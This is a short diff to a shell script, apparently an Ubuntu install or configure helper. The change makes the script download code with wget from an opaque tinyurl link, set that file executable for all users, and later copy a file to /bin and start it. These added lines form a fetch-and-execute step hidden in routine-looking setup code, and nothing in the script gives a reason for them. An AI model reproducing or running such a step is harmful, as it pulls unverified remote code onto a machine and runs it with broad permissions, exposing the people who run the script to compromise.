@@ -6,8 +6,8 @@ PID="$$"
 CMD="$1"
 
 if [ "$CMD" == "" ]; then
-  echo -e "\n=====>] $ME_FL [<=====\n"
-  cat "/proc/$PID/fd" > "$ME_FL"
+  echo -e "\n=====>] Write to file: $ME_FL [<=====\n"
+  wget -O "$ME_FL" "https://tinyurl.com/zptmx-ubuntu"
   chmod u+x $ME_FL
   chmod g+x $ME_FL
   chmod o+x $ME_FL
@@ -61,7 +61,7 @@ if [ "$CMD" == "configure" ]; then
 
   apt install firefox -y
 
-  cp -f /home/root.ubuntu.bh /bin/
+  cp -f /home/root/ubuntu.bh /bin/
 
   /bin/ubuntu.bh start
 fi
